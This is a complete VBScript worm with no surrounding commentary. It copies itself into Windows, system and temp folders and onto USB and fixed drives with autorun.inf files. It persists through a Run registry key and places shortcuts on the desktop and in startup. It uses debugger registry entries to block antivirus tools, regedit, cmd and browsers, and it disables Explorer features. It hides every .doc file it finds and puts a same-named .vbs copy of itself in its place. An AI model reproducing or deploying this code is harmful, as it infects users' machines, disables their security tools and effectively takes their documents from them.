on error resume next
Dim winpath, sispath, tempath, FlashDisk, fso, wsshell, nask, autorn, filekor
Dim Drives, Drive, cekdrive, tekvir, text, Buatfile, namafile, filetext
Dim DesPath1, DesPath2, Scut1, Scut2
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsshell = CreateObject("WScript.Shell")
Set filetext = fso.OpenTextFile(WScript.ScriptFullName,1)
namafile = "wain_cantik.vbs"
autorn = "[autorun]"&vbcrlf&"shellexecute=wscript.exe " & namafile
Set nask = fso.getfile(Wscript.ScriptFullname)
cekdrive = nask.drive.drivetype

Set winpath = fso.GetSpecialFolder(0)
Set sispath = fso.GetSpecialFolder(1)
Set tempath = fso.GetSpecialFolder(2)
Set text = nask.openastextstream(1, -2)
Randomize Timer
Aka=Int(rnd*1000)
Akb=Int(rnd*30)
If Akb=0 Then Akb=10
Tamb=String(Akb,"-")
tekavir = text.readline
tekvir="' "&Aka&Tamb&vbCrLf
Do While Not text.atendofstream
tekvir = tekvir&text.readline
tekvir = tekvir&vbCrLf
Loop
Shortcut()
sudah=0

Do
Set filekor = fso.getfile(winpath & "\" & namafile)
filekor.Attributes = 32
Set filekor = fso.createtextfile(winpath & "\" & namafile, 2, True)
filekor.write tekvir
filekor.Close
Set filekor = fso.getfile(winpath & "\" & namafile)
filekor.Attributes = 39

For Each FlashDisk In fso.drives
If (FlashDisk.drivetype = 1 Or FlashDisk.drivetype = 2) And FlashDisk.Path <> "A:" Then
Set filekor = fso.getfile(FlashDisk.Path & "\" & namafile)
filekor.Attributes = 32
Set filekor = fso.createtextfile(FlashDisk.Path & "\" & namafile, 2, True)
filekor.write tekvir
filekor.Close
Set filekor = fso.getfile(FlashDisk.Path & "\" & namafile)
filekor.Attributes = 39 
Set filekor = fso.getfile(FlashDisk.Path & "\autorun.inf")
filekor.Attributes = 32
Set filekor = fso.createtextfile(FlashDisk.Path & "\autorun.inf", 2, True)
filekor.write autorn
filekor.Close
Set filekor = fso.getfile(FlashDisk.Path & "\autorun.inf")
filekor.Attributes = 39
End If
Next

rdw="REG_DWORD"
Smwc = "\Software\Microsoft\Windows\CurrentVersion\"
Hsmwci = "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\"
wsshell.regwrite "HKLM"&Smwc&"Run\WinSystem", "wscript.exe " & winpath & "\" & namafile
wsshell.regwrite Hsmwci&"cmd.exe\Debugger"," "
wsshell.regwrite Hsmwci&"msconfig.exe\Debugger"," "
wsshell.regwrite Hsmwci&"regedit.exe\Debugger"," "
wsshell.regwrite Hsmwci&"PCMAV.exe\Debugger"," "
wsshell.regwrite Hsmwci&"PCMAV-CLN.exe\Debugger"," "
wsshell.regwrite Hsmwci&"PCMAV-RTP.exe\Debugger"," "
wsshell.regwrite Hsmwci&"PCMAV-SE.exe\Debugger"," "
wsshell.regwrite Hsmwci&"VB6.exe\Debugger"," "
wsshell.regwrite Hsmwci&"autorun.exe\Debugger"," "
wsshell.regwrite Hsmwci&"ansav.exe\Debugger"," "
wsshell.regwrite Hsmwci&"viremoval.exeDebugger"," "
wsshell.regwrite Hsmwci&"avscan.exe\Debugger"," "
wsshell.regwrite Hsmwci&"avgnt.exe\Debugger"," "
wsshell.regwrite Hsmwci&"iexplore.exe\Debugger"," "
wsshell.regwrite Hsmwci&"firefox.exe\Debugger"," "
wsshell.regwrite Hsmwci&"mplayerc.exe\Debugger"," "
wsshell.regwrite "HKLM"&Smwc&"Run\WinSystem", "wscript.exe " & winpath & "\" & namafile
wsshell.RegWrite "HKCU"&Smwc&"Policies\Explorer\NoFind", "1", rdw
wsshell.RegWrite "HKCU"&Smwc&"Policies\Explorer\NoFolderOptions", "1", rdw
wsshell.RegWrite "HKCU"&Smwc&"Policies\Explorer\NoRun", "1", rdw
wsshell.RegWrite "HKCU"&Smwc&"Policies\System\DisableRegistryTools", "0", rdw
wsshell.RegWrite "HKCU"&Smwc&"Policies\System\DisableTaskMgr", "0", rdw
wsshell.regwrite "HKCR\vbsfile\DefaultIcon", "shell32.dll,2"
If Minute(Now)=1 and sudah<>1 Then 
Tularifiledoc()
sudah=1
End If
If cekdrive <> 1 Then Wscript.sleep 100000
Loop While cekdrive <> 1

Sub Tularifiledoc()
Set Drives=fso.drives
For Each Drive In Drives
If Drive<>"A:" Then
If Drive.IsReady Then
Cari Drive & "\" 
End If
End If
Next
End sub

Sub Shortcut()
DesPath1 = wsshell.SpecialFolders("Desktop")
DesPath2 = wsshell.SpecialFolders("StartUp")
Set Scut1 = wsshell.CreateShortcut(DesPath1 & "\kozet tea.lnk")
Set Scut2 = wsshell.CreateShortcut(DesPath2 & "\Ciampea Kota Metropolitan.lnk")
Set Fileke1 = fso.createtextfile(sispath& "\zetwir.vbs", 2, True) 
Set Fileke2 = fso.createtextfile(tempath& "\kozet.vbs", 2, True)
Fileke1.Write tekvir
Fileke1.Close()
Scut1.TargetPath = wsshell.ExpandEnvironmentStrings(sispath&"\zetwir.vbs")
Scut1.Save
Fileke2.Write tekvir
Fileke2.Close()
Scut2.TargetPath = wsshell.ExpandEnvironmentStrings(tempath&"\kozet.vbs")
Scut2.Save
End Sub

Function Cari(Path)
On Error Resume Next
Dim Folder, Subfolder, SubFolders, File, Files, filekor
Set Folder=fso.GetFolder(Path)
Set Files=Folder.Files
For Each File In Files
If fso.GetExtensionName(File.Path)="doc" Then
namfa=fso.GetBaseName(File.Path)
Set filekor = fso.GetFile(File.Path)
filekor.Attributes = 39
Set Buatfile=fso.CreateTextFile(File.ParentFolder & "\" & namfa & ".vbs")
Buatfile.Write tekvir
Buatfile.Close()
End If
Next
Set SubFolders=Folder.SubFolders
For Each Subfolder In Subfolders
Cari Subfolder.Path 
Next
End Function
